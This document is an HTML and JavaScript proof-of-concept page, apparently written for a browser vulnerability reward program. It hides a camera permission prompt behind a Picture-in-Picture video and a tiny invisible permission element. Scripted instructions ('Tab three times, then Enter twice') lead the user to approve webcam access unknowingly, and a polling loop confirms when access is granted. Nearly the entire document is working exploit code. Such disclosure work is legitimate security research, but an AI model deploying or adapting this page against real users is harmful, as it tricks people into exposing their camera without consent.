<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC: Permission Prompt Obscured by Video PiP (Variant for VRP)</title>
    <style>
        html { font-family: sans-serif; }
        #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
        #wrapper {
            position: absolute;
            bottom: 0;
            right: 0px;
        }
        #permElem {
            width: fit-content;
            height: 1px;
            font-size: 11px;
            outline: none;
            background: #fff;
            color: #888;
        }
        video { display: none; } /* Hide video initially */
    </style>
</head>
<body>
    <h1>PoC: Permission Prompt Obscured by Video PiP (Double Enter Variant)</h1>
    <p>This demonstrates a variant where user is tricked into pressing Enter twice: first closes PiP, second approves hidden permission. Integrated with webcam and hosted video for testing.</p>
    <p id="instructions">Click 'Start Webcam', then press Tab three times, then Enter twice</p>
    
    <!-- Webcam Video for Permission Test -->
    <video id="webcamPlayer" autoplay playsinline></video>
    <button id="startWebcamButton">Start Webcam (Request Camera Permission)</button>
    
    <!-- Hosted Video for PiP Obscuration -->
    <video id="pipVideo" loop>
        <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
    </video>
    
    <div id="wrapper">
        <permission id="permElem" type="camera"></permission>
    </div>
    
    <script>
        const instructions = document.getElementById('instructions');
        const startWebcamButton = document.getElementById('startWebcamButton');
        const webcamVideo = document.getElementById('webcamPlayer');
        const pipVideo = document.getElementById('pipVideo');
        const permElem = document.getElementById('permElem');
        let pipWindow;

        // Start Webcam and Trigger Permission Prompt
        startWebcamButton.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                webcamVideo.srcObject = stream;
                instructions.innerText = 'Press Tab three times, then Enter twice';
                startWebcamButton.disabled = true;
                // Focus on permElem to trigger prompt interaction
                permElem.focus();
            } catch (error) {
                alert('Failed to access webcam: ' + error.message);
            }
        });

        // Listen for keydown on permElem to open PiP
        permElem.addEventListener('keydown', async (e) => {
            if (e.keyCode === 9) return; // Ignore Tab
            if (pipWindow) return;

            // Play video and request PiP to obscure
            pipVideo.play();
            try {
                await pipVideo.requestPictureInPicture();
                // Adjust instructions for double Enter variant
                instructions.innerText = 'Press Tab three times, then Enter twice (First closes PiP, second approves)';
            } catch (error) {
                console.error('PiP failed:', error);
            }
        });

        // Monitor permission status (camera granted?)
        setInterval(async () => {
            const permStatus = await navigator.permissions.query({ name: 'camera' });
            if (permStatus.state === 'granted') {
                instructions.innerText = 'Permission granted! Thank you.';
                permElem.remove();
                if (pipWindow) pipWindow.close();
            }
        }, 500);

        // Handle PiP events
        pipVideo.addEventListener('enterpictureinpicture', () => {
            pipWindow = document.pictureInPictureElement;
        });
        pipVideo.addEventListener('leavepictureinpicture', () => {
            pipWindow = null;
        });
    </script>
</body>
</html>
